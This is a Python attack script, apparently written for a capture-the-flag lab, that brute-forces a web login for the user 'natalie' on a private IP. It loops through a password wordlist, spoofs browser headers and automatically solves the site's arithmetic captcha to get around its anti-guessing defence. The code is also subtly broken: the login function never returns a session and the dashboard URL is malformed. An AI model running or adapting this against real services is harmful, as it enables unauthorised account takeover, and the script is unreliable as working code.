import requests
import re
from bs4 import BeautifulSoup

ip='10.113.135.232'
url = f"http://{ip}/login"
username = 'natalie'
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{ip}",
}


wordlist = "/home/brakka/thm/Capture/passwords.txt"

wordlist_map=[]
with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
    for line in file:
        word = line.strip()
        wordlist_map.append(word)


found = False
session = None

def get_error_message(html,username):
    soup = BeautifulSoup(html, 'html.parser')
    error_tag = soup.find('p', class_='error')
    if error_tag:
        return error_tag.text.strip()
    else:
        print("No error message found in the response.")
        return None

def resolve_captcha(text,username):
    pattern = r'(\d+)\s*([+\-*/])\s*(\d+)\s*=\s*\?'
    match = re.search(pattern, text)
    
    if not match:
        return None
    
    num1 = int(match.group(1))
    operator = match.group(2)
    num2 = int(match.group(3))
    
    if operator == '+':
        result = num1 + num2
    elif operator == '-':
        result = num1 - num2
    elif operator == '*':
        result = num1 * num2
    elif operator == '/':
        result = num1 // num2 
    else:
        return None
    print(f"Captcha found: {num1} {operator} {num2} = {result}")
    
    return str(result)

def verify_captcha(response_text,username,password):
    if "Captcha enabled" in response_text:
        resolved_captcha = resolve_captcha(response_text,username)
        if resolved_captcha:
            print(f"✅ Captcha resolved: {resolved_captcha}")
            login_with_captcha(resolved_captcha, username,password)
        

def login_with_captcha(captcha_solution, username, password):
    global session
    session = requests.Session()
    data = {"username": username, "password": password, "captcha": captcha_solution}
    print(f"Attempting login: {username}, {password}, Captcha: {captcha_solution}")
    response = session.post(url, data=data, headers=headers)
    error_message = get_error_message(response.text,username)
    if error_message:
        print(f"❌ Login failed: {error_message}")
    else:
        print(f"++++++++++++++++++++++++++++++++++++++++++++++++++++✅ Login successful for {username} and {password} with Captcha solution: {captcha_solution}++++++++++++++++++++++")
        return password

def login(password):
    global session
    session = requests.Session()
    data = {"username": username, "password": password}
    print(f"Attempting login: {username}, {password}")
    response = session.post(url, data=data, headers=headers)
    error_message = get_error_message(response.text,username)
    if error_message:
        print(f"❌ Login failed: {error_message}")
    if "Captcha enabled" in response.text:
        print("❌ Login failed: Captcha enabled")
        verify_captcha(response.text,username,password)
        return None
   
   

if __name__ == "__main__":
    for password in wordlist_map:
        session = login(password)
        
    if session:
        dashboard_resp = session.get(f"http:/{ip}/dashboard.php")
        print(f"Dashboard status: {dashboard_resp.status_code}")